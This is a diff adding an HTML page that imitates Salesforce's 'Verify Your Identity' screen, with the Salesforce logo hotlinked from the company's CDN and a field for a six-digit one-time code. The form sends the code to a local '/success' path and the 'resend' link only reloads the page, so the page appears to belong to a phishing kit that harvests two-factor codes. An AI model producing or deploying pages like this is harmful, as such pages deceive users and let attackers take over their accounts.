@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Login | Salesforce</title>
+        <link rel="stylesheet" href="/styles/code.css" />
+        <link rel="stylesheet" href="/styles/bootstrap.min.css" />
+    </head>
+    <body>
+        <div class="login_form">
+            <form method="get" action="/success" class="wes-stack">
+                <div class="main_form">
+                    <header class="text-center">
+                        <div class="img-container">
+                            <img
+                                class="logo"
+                                src="https://c1.sfdcstatic.com/content/dam/sfdc-docs/www/logos/logo-salesforce.svg"
+                                alt="Log in with Salesforce"
+                            />
+                        </div>
+                        <slot name="otp-title"
+                            ><h1 type-style="display-6">
+                                Verify Your Identity
+                            </h1></slot
+                        ><slot name="otp-subtitle"
+                            ><p style="text-align: left" type-style="body-3">
+                                You're trying to log in to Salesforce. To make
+                                sure your Salesforce account is secure, we have
+                                to verify your identity.
+                            </p></slot
+                        >
+                    </header>
+                    <div class="input">
+                        <input
+                            id="field"
+                            type="number"
+                            name="otp"
+                            autocomplete="one-time-code"
+                            aria-errormessage="input-error"
+                            aria-invalid="true"
+                            required
+                            maxlength="6"
+                            minlength="6"
+                        />
+                    </div>
+                    <div class="">
+                        <a href="#" id="submit">Verify</a>
+                        <p style="color: red" id="note"></p>
+                    </div>
+                    <div class="text-center">
+                        <p type-style="body-3">
+                            Didn’t get the email?<br />
+                            Check your spam folder. If you still can’t find
+                            it,&nbsp;<a
+                                onclick="location.reload(); return false;"
+                                href="#"
+                                tabindex="0"
+                                class="link"
+                                >resend the email</a
+                            >.
+                        </p>
+                    </div>
+                </div>
+                <div id="loading">
+                    <b>Loading</b>
+                </div>
+            </form>
+        </div>
+        <script src="/js/code.js"></script>
+    </body>
+</html>
